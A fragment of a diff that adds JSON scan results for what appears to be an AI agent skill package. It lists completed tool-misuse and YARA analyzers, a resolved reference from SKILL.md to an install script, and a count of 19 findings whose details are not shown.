+        "analyzer_id": "static_patterns_tool_misuse",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      },
+      {
+        "analyzer_id": "static_yara",
+        "status": "completed",
+        "planned_work": 6,
+        "completed": 6,
+        "partial": 0,
+        "skipped": 0,
+        "failed": 0,
+        "unaccounted": 0
+      }
+    ],
+    "references": [
+      {
+        "source_path": "SKILL.md",
+        "line": 12,
+        "column": 9,
+        "evidence": "1. Run `scripts/install.sh` to install the required tools.",
+        "target_path": "scripts/install.sh",
+        "status": "resolved",
+        "disposition": "analyzed"
+      }
+    ],
+    "limitations": [],
+    "findings_before_filtering": 19,
+    "findings_after_filtering": 19
+  }
+}
